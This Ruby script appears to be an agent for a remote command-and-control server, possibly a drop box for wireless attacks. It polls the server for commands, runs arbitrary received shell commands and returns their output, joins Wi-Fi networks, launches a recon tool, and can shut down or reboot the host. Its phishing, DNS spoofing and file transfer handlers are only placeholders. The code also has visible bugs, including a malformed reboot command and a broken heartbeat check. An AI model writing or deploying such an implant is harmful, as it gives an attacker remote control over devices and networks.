#!/usr/bin/env ruby
require 'rest-client' # https://github.com/rest-client/rest-client
require 'json'
require 'dotenv/load'
require 'uri'
require 'colorize'
require 'whirly'
require 'paint'
require_relative 'login'
exit! unless HPTOKEN

# Configuration
server =          ENV['SERVER']
iface =           ENV['INTERFACE']
token =           HPTOKEN.merge({content_type: :json, accept: :json})
timestamp =       { timestamp: Time.now }.to_json
nrecon_path =     '/root/git/nrecon/nrecon.rb'
connect_path =    '/root/git/letmein/connect.sh'
Whirly.configure spinner: "arrow3"


RestClient.post(server+"/api/agent/checkin", { timestamp: Time.now }.to_json, token)
loop do
  Whirly.start do
    Whirly.status = "Listening to C2C Server...".cyan
    timestamp = { timestamp: Time.now }.to_json
    sleep 6.66

    begin
      if timestamp >= timestamp + 60
        heartbeat = RestClient.post(server+"/api/agent/heartbeat", timestamp, token).body
      end
      cmd = JSON.parse(RestClient.get(server+"/api/agent/#{ ENV['HANDLE'] }/getcmd", token).body)[0]
      if cmd
        puts "Command from server:".green
        puts JSON.pretty_generate(cmd).yellow
        if cmd['function'] == 'command'
          res = `#{cmd['arguments']}`
        elsif cmd['function'] == 'connect'
          RestClient.post(server+"/api/agent/checkout", { function: 'new connection', arguments: cmd['arguments'], timestamp: Time.now }.to_json, token)
	        res = `#{ connect_path } #{ iface } #{ cmd['arguments'] }`
          current_ssid = cmd['arguments']
          RestClient.post(server+"/api/agent/checkin", { timestamp: Time.now }.to_json, token)
        elsif cmd['function'] == 'shutdown'
          RestClient.post(server+"/api/agent/checkout", { result: 'Powering off.', timestamp: Time.now }.to_json, token)
          res = `shutdown -h #{ cmd['arguments'] }`
        elsif cmd['function'] == 'reboot'
          RestClient.post(server+"/api/agent/checkout", { result: 'rebooting...', timestamp: Time.now }.to_json, token)
          res = `reboot }`
        elsif cmd['function'] == 'recon'
	       res = 'Running Recon'
         if current_ssid.empty?
	         nrec_proc = IO.popen("ruby #{ nrecon_path } #{ cmd['arguments'] }", 'w')
          else
            nrec_proc = IO.popen("ruby #{ nrecon_path } #{ current_ssid }", 'w')
          end
        elsif cmd['function'] == 'phishing'
          res = `echo "gone phishing..."`
        elsif cmd['function'] == 'dns'
          res = `echo "bettercap stuff here..."`
        elsif cmd['function'] == 'sendfile'
          res = `echo "send file..."`
        elsif cmd['function'] == 'downloadfile'
          res = `echo "download file..."`
        end
        RestClient.post(server+"/api/agent/command", { result: res, function: cmd['function'], arguments: cmd['arguments'], timestamp: Time.now }.to_json , token)          
      end
    rescue => e
      puts "Error communicating server. #{ e }".red
      Whirly.status = " Retrying in 5.4.3.2.1...".light_blue
      sleep 5
      retry
    end
  end
end
RestClient.post(server+"/api/agent/checkout", { timestamp: Time.now }.to_json, token)
